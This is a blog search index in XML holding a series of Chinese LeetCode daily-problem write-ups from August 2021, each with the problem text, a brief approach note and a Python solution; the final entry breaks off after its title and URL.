<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[力扣每日一题 2021/8/29]]></title>
    <url>%2Fposts%2Ff4d069c8%2F</url>
    <content type="text"><![CDATA[题目：1588. 所有奇数长度子数组的和难度：简单 给你一个正整数数组 arr ，请你计算所有可能的奇数长度子数组的和。 子数组 定义为原数组中的一个连续子序列。 请你返回 arr 中 所有奇数长度子数组的和 。 示例 1： 12345678910111213输入：arr = [1,4,2,5,3]输出：58解释：所有奇数长度子数组和它们的和为：[1] = 1[4] = 4[2] = 2[5] = 5[3] = 3[1,4,2] = 7[4,2,5] = 11[2,5,3] = 10[1,4,2,5,3] = 15我们将所有值求和得到 1 + 4 + 2 + 5 + 3 + 7 + 11 + 10 + 15 = 58 示例 2： 123输入：arr = [1,2]输出：3解释：总共只有 2 个长度为奇数的子数组，[1] 和 [2]。它们的和为 3 。 示例 3： 12输入：arr = [10,11,12]输出：66 提示： 1 &lt;= arr.length &lt;= 100 1 &lt;= arr[i] &lt;= 1000 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/sum-of-all-odd-length-subarrays/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 不想思考了，直接暴力吧 解题代码12345678910class Solution: def sumOddLengthSubarrays(self, arr: List[int]) -&gt; int: ans = 0 n = len(arr) for i in range(n): for j in range(i,n): if (j - i + 1) &amp; 1: for k in range(i,j + 1): ans += arr[k] return ans]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
        <tag>python3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/8/28]]></title>
    <url>%2Fposts%2F83d7595e%2F</url>
    <content type="text"><![CDATA[题目：1480. 一维数组的动态和难度：简单 给你一个数组 nums 。数组「动态和」的计算公式为：runningSum[i] = sum(nums[0]…nums[i]) 。 请返回 nums 的动态和。 示例 1： 123输入：nums = [1,2,3,4]输出：[1,3,6,10]解释：动态和计算过程为 [1, 1+2, 1+2+3, 1+2+3+4] 。 示例 2： 123输入：nums = [1,1,1,1,1]输出：[1,2,3,4,5]解释：动态和计算过程为 [1, 1+1, 1+1+1, 1+1+1+1, 1+1+1+1+1] 。 示例 3： 12输入：nums = [3,1,2,10,1]输出：[3,4,6,16,17] 提示： 1 &lt;= nums.length &lt;= 1000 -10^6 &lt;= nums[i] &lt;= 10^6 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/running-sum-of-1d-array/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 一个简单的前缀和题目，直接原地修改即可 解题代码12345class Solution: def runningSum(self, nums: List[int]) -&gt; List[int]: for i in range(1,len(nums)): nums[i] += nums[i - 1] return nums]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
        <tag>python3</tag>
        <tag>前缀和</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/8/27]]></title>
    <url>%2Fposts%2F136844cf%2F</url>
    <content type="text"><![CDATA[题目：295. 数据流的中位数难度：困难 中位数是有序列表中间的数。如果列表长度是偶数，中位数则是中间两个数的平均值。 例如， [2,3,4] 的中位数是 3 [2,3] 的中位数是 (2 + 3) / 2 = 2.5 设计一个支持以下两种操作的数据结构： void addNum(int num) - 从数据流中添加一个整数到数据结构中。 double findMedian() - 返回目前所有元素的中位数。 示例： 12345addNum(1)addNum(2)findMedian() -&gt; 1.5addNum(3) findMedian() -&gt; 2 进阶: 如果数据流中所有整数都在 0 到 100 范围内，你将如何优化你的算法？ 如果数据流中 99% 的整数都在 0 到 100 范围内，你将如何优化你的算法？ 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/find-median-from-data-stream/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 有 有，，有，，，有序数组？ 解题代码12345678910111213141516171819202122232425from sortedcontainers import SortedListclass MedianFinder: def __init__(self): """ initialize your data structure here. """ self.nums = SortedList() def addNum(self, num: int) -&gt; None: self.nums.add(num) def findMedian(self) -&gt; float: n = len(self.nums) if n &amp; 1: return self.nums[n // 2] else: return (self.nums[n // 2] + self.nums[n // 2 - 1]) / 2# Your MedianFinder object will be instantiated and called as such:# obj = MedianFinder()# obj.addNum(num)# param_2 = obj.findMedian()]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>设计</tag>
        <tag>python3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/8/25]]></title>
    <url>%2Fposts%2Ffd6625e3%2F</url>
    <content type="text"><![CDATA[题目：797. 所有可能的路径难度：中等 给你一个有 n 个节点的 有向无环图（DAG），请你找出所有从节点 0 到节点 n-1 的路径并输出（不要求按特定顺序） 二维数组的第 i 个数组中的单元都表示有向图中 i 号节点所能到达的下一些节点，空就是没有下一个结点了。 译者注：有向图是有方向的，即规定了 a→b 你就不能从 b→a 。 示例 1： 123输入：graph = [[1,2],[3],[3],[]]输出：[[0,1,3],[0,2,3]]解释：有两条路径 0 -&gt; 1 -&gt; 3 和 0 -&gt; 2 -&gt; 3 示例 2： 12输入：graph = [[4,3,1],[3,2,4],[3],[4],[]]输出：[[0,4],[0,3,4],[0,1,3,4],[0,1,2,3,4],[0,1,4]] 示例 3： 12输入：graph = [[1],[]]输出：[[0,1]] 示例 4： 12输入：graph = [[1,2,3],[2],[3],[]]输出：[[0,1,2,3],[0,2,3],[0,3]] 示例 5： 12输入：graph = [[1,3],[2],[3],[]]输出：[[0,1,2,3],[0,3]] 提示： n == graph.length 2 &lt;= n &lt;= 15 0 &lt;= graph[i][j] &lt; n graph[i][j] != i（即，不存在自环） graph[i] 中的所有元素 互不相同 保证输入为 有向无环图（DAG） 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/all-paths-from-source-to-target/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 回溯 解题代码123456789101112131415class Solution: def allPathsSourceTarget(self, graph: List[List[int]]) -&gt; List[List[int]]: n = len(graph) ans = [] def dfs(s,e,t): nonlocal graph if s == e: ans.append(list(t)) return for i in graph[s]: t.append(i) dfs(i,e,t) t.pop() dfs(0,n - 1,[0]) return ans]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>深度优先搜索</tag>
        <tag>dfs</tag>
        <tag>回溯算法</tag>
        <tag>图</tag>
        <tag>python3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/8/23]]></title>
    <url>%2Fposts%2F140580d6%2F</url>
    <content type="text"><![CDATA[题目：1646. 获取生成数组中的最大值难度：简单 给你一个整数 n 。按下述规则生成一个长度为 n + 1 的数组 nums ： nums[0] = 0 nums[1] = 1 当 2 &lt;= 2 * i &lt;= n 时，nums[2 * i] = nums[i] 当 2 &lt;= 2 * i + 1 &lt;= n 时，nums[2 * i + 1] = nums[i] + nums[i + 1] 返回生成数组 nums 中的 最大 值。 示例 1： 123456789101112输入：n = 7输出：3解释：根据规则： nums[0] = 0 nums[1] = 1 nums[(1 * 2) = 2] = nums[1] = 1 nums[(1 * 2) + 1 = 3] = nums[1] + nums[2] = 1 + 1 = 2 nums[(2 * 2) = 4] = nums[2] = 1 nums[(2 * 2) + 1 = 5] = nums[2] + nums[3] = 1 + 2 = 3 nums[(3 * 2) = 6] = nums[3] = 2 nums[(3 * 2) + 1 = 7] = nums[3] + nums[4] = 2 + 1 = 3因此，nums = [0,1,1,2,1,3,2,3]，最大值 3 示例 2： 123输入：n = 2输出：1解释：根据规则，nums[0]、nums[1] 和 nums[2] 之中的最大值是 1 示例 3： 123输入：n = 3输出：2解释：根据规则，nums[0]、nums[1]、nums[2] 和 nums[3] 之中的最大值是 2 提示： 0 &lt;= n &lt;= 100 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/get-maximum-in-generated-array/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 模拟 解题代码1234567891011121314class Solution: def getMaximumGenerated(self, n: int) -&gt; int: if n == 0: return 0 nums = [0] * (n + 1) nums[0] = 0 nums[1] = 1 for i in range(n + 1): if 2 &lt;= 2 * i &lt;= n: nums[2 * i] = nums[i] if 2 &lt;= 2 * i + 1 &lt;= n: nums[2 * i + 1] = nums[i] + nums[i + 1] # print(nums) return max(nums)]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
        <tag>python3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/8/21]]></title>
    <url>%2Fposts%2Ffa0be1fa%2F</url>
    <content type="text"><![CDATA[题目：443. 压缩字符串难度：中等 给你一个字符数组 chars ，请使用下述算法压缩： 从一个空字符串 s 开始。对于 chars 中的每组 连续重复字符 ： 如果这一组长度为 1 ，则将字符追加到 s 中。 否则，需要向 s 追加字符，后跟这一组的长度。 压缩后得到的字符串 s 不应该直接返回 ，需要转储到字符数组 chars 中。需要注意的是，如果组长度为 10 或 10 以上，则在 chars 数组中会被拆分为多个字符。 请在 修改完输入数组后 ，返回该数组的新长度。 你必须设计并实现一个只使用常量额外空间的算法来解决此问题。 示例 1： 1234输入：chars = [&quot;a&quot;,&quot;a&quot;,&quot;b&quot;,&quot;b&quot;,&quot;c&quot;,&quot;c&quot;,&quot;c&quot;]输出：返回 6 ，输入数组的前 6 个字符应该是：[&quot;a&quot;,&quot;2&quot;,&quot;b&quot;,&quot;2&quot;,&quot;c&quot;,&quot;3&quot;]解释：&quot;aa&quot; 被 &quot;a2&quot; 替代。&quot;bb&quot; 被 &quot;b2&quot; 替代。&quot;ccc&quot; 被 &quot;c3&quot; 替代。 示例 2： 1234输入：chars = [&quot;a&quot;]输出：返回 1 ，输入数组的前 1 个字符应该是：[&quot;a&quot;]解释：没有任何字符串被替代。 示例 3： 12345输入：chars = [&quot;a&quot;,&quot;b&quot;,&quot;b&quot;,&quot;b&quot;,&quot;b&quot;,&quot;b&quot;,&quot;b&quot;,&quot;b&quot;,&quot;b&quot;,&quot;b&quot;,&quot;b&quot;,&quot;b&quot;,&quot;b&quot;]输出：返回 4 ，输入数组的前 4 个字符应该是：[&quot;a&quot;,&quot;b&quot;,&quot;1&quot;,&quot;2&quot;]。解释：由于字符 &quot;a&quot; 不重复，所以不会被压缩。&quot;bbbbbbbbbbbb&quot; 被 “b12” 替代。注意每个数字在数组中都有它自己的位置。 提示： 1 &lt;= chars.length &lt;= 2000 chars[i] 可以是小写英文字母、大写英文字母、数字或符号 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/string-compression/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 模拟 解题代码1234567891011121314151617181920212223242526272829303132class Solution: def compress(self, chars: List[str]) -&gt; int: n = len(chars) last = chars[0] idx = 1 cur = 0 cnt = 1 def fill(): nonlocal cur nonlocal last nonlocal cnt chars[cur] = last cur += 1 if cnt != 1: pos = cur while cnt: m = cnt % 10 chars[cur] = str(m) cur += 1 cnt //= 10 chars[pos:cur] = reversed(chars[pos:cur]) while idx &lt; n: if chars[idx] != last: fill() last = chars[idx] cnt = 1 else: cnt += 1 idx += 1 fill() return cur]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>字符串</tag>
        <tag>python3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/8/20]]></title>
    <url>%2Fposts%2F8d0cd16c%2F</url>
    <content type="text"><![CDATA[题目：541. 反转字符串 II难度：简单 给定一个字符串 s 和一个整数 k，从字符串开头算起，每 2k 个字符反转前 k 个字符。 如果剩余字符少于 k 个，则将剩余字符全部反转。 如果剩余字符小于 2k 但大于或等于 k 个，则反转前 k 个字符，其余字符保持原样。 示例 1： 12输入：s = &quot;abcdefg&quot;, k = 2输出：&quot;bacdfeg&quot; 示例 2： 12输入：s = &quot;abcd&quot;, k = 2输出：&quot;bacd&quot; 提示： 1 &lt;= s.length &lt;= 104 s 仅由小写英文组成 1 &lt;= k &lt;= 104 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/reverse-string-ii/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 模拟 解题代码1234567891011121314151617181920212223class Solution: def reverseStr(self, s: str, k: int) -&gt; str: ls = list(s) def reverse(s,_len): if _len &lt; k: l,r = s,s + _len - 1 # elif _len &lt; k * 2 and _len &gt;= k: # pass else: l,r = s,s + k - 1 while l &lt; r: ls[l],ls[r] = ls[r],ls[l] l += 1 r -= 1 i = 0 while i &lt; len(s): nexti = i + k * 2 if nexti &lt; len(s): reverse(i,k * 2) else: reverse(i,len(s) - i) i = nexti return ''.join(ls)]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>双指针</tag>
        <tag>字符串</tag>
        <tag>python3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/8/19]]></title>
    <url>%2Fposts%2Fdffd3a0b%2F</url>
    <content type="text"><![CDATA[题目：345. 反转字符串中的元音字母难度：简单 给你一个字符串 s ，仅反转字符串中的所有元音字母，并返回结果字符串。 元音字母包括 ‘a’、’e’、’i’、’o’、’u’，且可能以大小写两种形式出现。 示例 1： 12输入：s = &quot;hello&quot;输出：&quot;holle&quot; 示例 2： 12输入：s = &quot;leetcode&quot;输出：&quot;leotcede&quot; 提示： 1 &lt;= s.length &lt;= 3 * 105 s 由 可打印的 ASCII 字符组成 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/reverse-vowels-of-a-string/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 双指针扫描交换即可 解题代码1234567891011121314151617class Solution: def reverseVowels(self, s: str) -&gt; str: l = 0 r = len(s) - 1 ls = list(s) def check(i): i = str(i).lower() return i == 'a' or i == 'e' or i == 'i' or i == 'o' or i == 'u' while l &lt; r: while l &lt; r and not check(ls[l]): l += 1 while l &lt; r and not check(ls[r]): r -= 1 ls[r],ls[l] = ls[l],ls[r] r -= 1 l += 1 return ''.join(ls)]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>双指针</tag>
        <tag>字符串</tag>
        <tag>python3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/8/17]]></title>
    <url>%2Fposts%2F3845170c%2F</url>
    <content type="text"><![CDATA[题目：551. 学生出勤记录 I难度：简单 给你一个字符串 s 表示一个学生的出勤记录，其中的每个字符用来标记当天的出勤情况（缺勤、迟到、到场）。记录中只含下面三种字符： ‘A’：Absent，缺勤 ‘L’：Late，迟到 ‘P’：Present，到场 如果学生能够 同时 满足下面两个条件，则可以获得出勤奖励： 按 总出勤 计，学生缺勤（’A’）严格 少于两天。 学生 不会 存在 连续 3 天或 连续 3 天以上的迟到（’L’）记录。 如果学生可以获得出勤奖励，返回 true ；否则，返回 false 。 示例 1： 123输入：s = &quot;PPALLP&quot;输出：true解释：学生缺勤次数少于 2 次，且不存在 3 天或以上的连续迟到记录。 示例 2： 123输入：s = &quot;PPALLL&quot;输出：false解释：学生最后三天连续迟到，所以不满足出勤奖励的条件。 提示： 1 &lt;= s.length &lt;= 1000 s[i] 为 ‘A’、’L’ 或 ‘P’ 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/student-attendance-record-i/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 模拟 解题代码123456789101112131415class Solution: def checkRecord(self, s: str) -&gt; bool: a = 0 l = 0 b = 0 for idx,i in enumerate(s): if i == 'A': a += 1 elif i == 'L': r = idx + 1 while r &lt; len(s) and s[r] == 'L': r += 1 if r - idx &gt;= 3: return False return a &lt; 2]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>字符串</tag>
        <tag>python3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/8/10]]></title>
    <url>%2Fposts%2Fa62182af%2F</url>
    <content type="text"><![CDATA[题目：413. 等差数列划分难度：中等 如果一个数列 至少有三个元素 ，并且任意两个相邻元素之差相同，则称该数列为等差数列。 例如，[1,3,5,7,9]、[7,7,7,7] 和 [3,-1,-5,-9] 都是等差数列。 给你一个整数数组 nums ，返回数组 nums 中所有为等差数组的 子数组 个数。 子数组 是数组中的一个连续序列。 示例 1： 123输入：nums = [1,2,3,4]输出：3解释：nums 中有三个子等差数组：[1, 2, 3]、[2, 3, 4] 和 [1,2,3,4] 自身。 示例 2： 12输入：nums = [1]输出：0 提示： 1 &lt;= nums.length &lt;= 5000 -1000 &lt;= nums[i] &lt;= 1000 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/arithmetic-slices/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 枚举 解题代码12345678910111213141516171819class Solution: def numberOfArithmeticSlices(self, nums: List[int]) -&gt; int: n = len(nums) if n &lt; 3: return 0 d = nums[1] - nums[0] t = 0 ans = 0 for i in range(2, n): if nums[i] - nums[i - 1] == d: t += 1 else: d = nums[i] - nums[i - 1] t = 0 ans += t return ans]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
        <tag>python3</tag>
        <tag>枚举</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/8/9]]></title>
    <url>%2Fposts%2F9c643081%2F</url>
    <content type="text"><![CDATA[题目：313. 超级丑数难度：中等 超级丑数 是一个正整数，并满足其所有质因数都出现在质数数组 primes 中。 给你一个整数 n 和一个整数数组 primes ，返回第 n 个 超级丑数 。 题目数据保证第 n 个 超级丑数 在 32-bit 带符号整数范围内。 示例 1： 123输入：n = 12, primes = [2,7,13,19]输出：32 解释：给定长度为 4 的质数数组 primes = [2,7,13,19]，前 12 个超级丑数序列为：[1,2,4,7,8,13,14,16,19,26,28,32] 。 示例 2： 123输入：n = 1, primes = [2,3,5]输出：1解释：1 不含质因数，因此它的所有质因数都在质数数组 primes = [2,3,5] 中。 提示： 1 &lt;= n &lt;= 106 1 &lt;= primes.length &lt;= 100 2 &lt;= primes[i] &lt;= 1000 题目数据保证 primes[i] 是一个质数 primes 中的所有值都 互不相同 ，且按 递增顺序 排列 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/super-ugly-number/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 动态规划 解题代码12345678910111213141516class Solution: def nthSuperUglyNumber(self, n: int, primes: List[int]) -&gt; int: q = [0] * len(primes) uglys = [0] * n uglys[0] = 1 for i in range(1,n): _min = maxsize for j in range(len(primes)): t = uglys[q[j]] * primes[j] if _min &gt; t: _min = t uglys[i] = _min for j in range(len(primes)): if uglys[i] == uglys[q[j]] * primes[j]: q[j] += 1 return uglys[n - 1]]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>动态规划</tag>
        <tag>数学</tag>
        <tag>dp</tag>
        <tag>python3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/8/8]]></title>
    <url>%2Fposts%2Feb630017%2F</url>
    <content type="text"><![CDATA[题目：1137. 第 N 个泰波那契数难度：简单 泰波那契序列 Tn 定义如下： T0 = 0, T1 = 1, T2 = 1, 且在 n &gt;= 0 的条件下 Tn+3 = Tn + Tn+1 + Tn+2 给你整数 n，请返回第 n 个泰波那契数 Tn 的值。 示例 1： 12345输入：n = 4输出：4解释：T_3 = 0 + 1 + 1 = 2T_4 = 1 + 1 + 2 = 4 示例 2： 12输入：n = 25输出：1389537 提示： 0 &lt;= n &lt;= 37 答案保证是一个 32 位整数，即 answer &lt;= 2^31 - 1。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/n-th-tribonacci-number/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 按照定义 递推就可以了 解题代码12345678910111213141516class Solution: def tribonacci(self, n: int) -&gt; int: if n == 0: return 0 if n == 1 or n == 2: return 1 t0 = 0 t1 = 1 t2 = 1 t3 = t0 + t1 + t2 for i in range(3,n): t0 = t1 t1 = t2 t2 = t3 t3 = t0 + t1 + t2 return t3]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数学</tag>
        <tag>python3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/8/7]]></title>
    <url>%2Fposts%2F7bdc1d86%2F</url>
    <content type="text"><![CDATA[题目：457. 环形数组是否存在循环难度：中等 存在一个不含 0 的环形数组 nums ，每个 nums[i] 都表示位于下标 i 的角色应该向前或向后移动的下标个数： 如果 nums[i] 是正数，向前 移动 nums[i] 步 如果 nums[i] 是负数，向后 移动 nums[i] 步 因为数组是 环形 的，所以可以假设从最后一个元素向前移动一步会到达第一个元素，而第一个元素向后移动一步会到达最后一个元素。 数组中的 循环 由长度为 k 的下标序列 seq ： 遵循上述移动规则将导致重复下标序列 seq[0] -&gt; seq[1] -&gt; … -&gt; seq[k - 1] -&gt; seq[0] -&gt; … 所有 nums[seq[j]] 应当不是 全正 就是 全负 k &gt; 1 如果 nums 中存在循环，返回 true ；否则，返回 false 。 示例 1： 123输入：nums = [2,-1,1,2,2]输出：true解释：存在循环，按下标 0 -&gt; 2 -&gt; 3 -&gt; 0 。循环长度为 3 。 示例 2： 123输入：nums = [-1,2]输出：false解释：按下标 1 -&gt; 1 -&gt; 1 ... 的运动无法构成循环，因为循环的长度为 1 。根据定义，循环的长度必须大于 1 。 示例 3: 1234输入：nums = [-2,1,-1,-2,-2]输出：false解释：按下标 1 -&gt; 2 -&gt; 1 -&gt; ... 的运动无法构成循环，因为 nums[1] 是正数，而 nums[2] 是负数。所有 nums[seq[j]] 应当不是全正就是全负。 提示： 1 &lt;= nums.length &lt;= 5000 -1000 &lt;= nums[i] &lt;= 1000 nums[i] != 0 进阶： 你能设计一个时间复杂度为 O(n) 且额外空间复杂度为 O(1) 的算法吗？ 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/circular-array-loop/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 题目描述很迷惑，但看懂了过后其实就是查找环，可以参考查找链表中是不是有环的做法，使用快慢双指针 解题代码12345678910111213141516171819202122232425class Solution: def circularArrayLoop(self, nums: List[int]) -&gt; bool: n = len(nums) def next(idx): return (idx + nums[idx] + n) % n for i,num in enumerate(nums): if num == 0: continue slow = i fast = next(i) while nums[slow] * nums[fast] &gt; 0 and nums[slow] * nums[next(fast)] &gt; 0: if slow == fast: if slow == next(slow): break return True slow = next(slow) fast = next(next(fast)) t = i while nums[t] * nums[next(t)] &gt; 0: nums[t] = 0 t = next(t) return False]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>双指针</tag>
        <tag>数组</tag>
        <tag>python3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/8/6]]></title>
    <url>%2Fposts%2Fcdb2d10%2F</url>
    <content type="text"><![CDATA[题目：847. 访问所有节点的最短路径难度：困难 存在一个由 n 个节点组成的无向连通图，图中的节点按从 0 到 n - 1 编号。 给你一个数组 graph 表示这个图。其中，graph[i] 是一个列表，由所有与节点 i 直接相连的节点组成。 返回能够访问所有节点的最短路径的长度。你可以在任一节点开始和停止，也可以多次重访节点，并且可以重用边。 示例 1： 123输入：graph = [[1,2,3],[0],[0],[0]]输出：4解释：一种可能的路径为 [1,0,2,0,3] 示例 2： 123输入：graph = [[1],[0,2,4],[1,3,4],[2],[1,2]]输出：4解释：一种可能的路径为 [0,1,4,2,3] 提示： n == graph.length 1 &lt;= n &lt;= 12 0 &lt;= graph[i].length &lt; n graph[i] 不包含 i 如果 graph[a] 包含 b ，那么 graph[b] 也包含 a 输入的图总是连通图 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/shortest-path-visiting-all-nodes/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 抄袭官方题解 解题代码123456789101112131415161718192021class Solution: def shortestPathLength(self, graph: List[List[int]]) -&gt; int: n = len(graph) q = deque((i, 1 &lt;&lt; i, 0) for i in range(n)) seen = &#123;(i, 1 &lt;&lt; i) for i in range(n)&#125; ans = 0 while q: u, mask, dist = q.popleft() if mask == (1 &lt;&lt; n) - 1: ans = dist break # 搜索相邻的节点 for v in graph[u]: # 将 mask 的第 v 位置为 1 mask_v = mask | (1 &lt;&lt; v) if (v, mask_v) not in seen: q.append((v, mask_v, dist + 1)) seen.add((v, mask_v)) return ans]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>广度优先搜索</tag>
        <tag>bfs</tag>
        <tag>图</tag>
        <tag>python3</tag>
        <tag>状态压缩</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/8/5]]></title>
    <url>%2Fposts%2F95d27caa%2F</url>
    <content type="text"><![CDATA[题目：802. 找到最终的安全状态难度：中等 在有向图中，以某个节点为起始节点，从该点出发，每一步沿着图中的一条有向边行走。如果到达的节点是终点（即它没有连出的有向边），则停止。 对于一个起始节点，如果从该节点出发，无论每一步选择沿哪条有向边行走，最后必然在有限步内到达终点，则将该起始节点称作是 安全 的。 返回一个由图中所有安全的起始节点组成的数组作为答案。答案数组中的元素应当按 升序 排列。 该有向图有 n 个节点，按 0 到 n - 1 编号，其中 n 是 graph 的节点数。图以下述形式给出：graph[i] 是编号 j 节点的一个列表，满足 (i, j) 是图的一条有向边。 示例 1： 123输入：graph = [[1,2],[2,3],[5],[0],[5],[],[]]输出：[2,4,5,6]解释：示意图如上。 示例 2： 12输入：graph = [[1,2,3,4],[1,2],[3,4],[0,4],[]]输出：[4] 提示： n == graph.length 1 &lt;= n &lt;= 104 0 &lt;= graph[i].length &lt;= n graph[i] 按严格递增顺序排列。 图中可能包含自环。 图中边的数目在范围 [1, 4 * 104] 内。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/find-eventual-safe-states/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 安全节点就是不在环上的节点，所以dfs搜索一下就可以了 解题代码1234567891011121314class Solution: def eventualSafeNodes(self, graph: List[List[int]]) -&gt; List[int]: n = len(graph) color = [-1] * n def dfs(x): if color[x] &gt; -1: return color[x] == 1 color[x] = 0 for i in graph[x]: if not dfs(i): return False color[x] = 1 return True return [i for i in range(n) if dfs(i)]]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>深度优先搜索</tag>
        <tag>dfs</tag>
        <tag>图</tag>
        <tag>python3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/8/4]]></title>
    <url>%2Fposts%2Fe2d54c3c%2F</url>
    <content type="text"><![CDATA[题目：611. 有效三角形的个数难度：中等 给定一个包含非负整数的数组，你的任务是统计其中可以组成三角形三条边的三元组个数。 示例 1: 1234567输入: [2,2,3,4]输出: 3解释:有效的组合是: 2,3,4 (使用第一个 2)2,3,4 (使用第二个 2)2,2,3 注意: 数组长度不超过1000。 数组里整数的范围为 [0, 1000]。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/valid-triangle-number/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 排序后用双指针枚举 解题代码123456789101112131415class Solution: def triangleNumber(self, nums: List[int]) -&gt; int: nums.sort() ans = 0 n = len(nums) for i in range(n - 1,1,-1): l = 0 r = i - 1 while l &lt; r: if nums[l] + nums[r] &gt; nums[i]: ans += r - l r -= 1 else: l += 1 return ans]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>双指针</tag>
        <tag>数组</tag>
        <tag>python3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/8/3]]></title>
    <url>%2Fposts%2F7cb1d99f%2F</url>
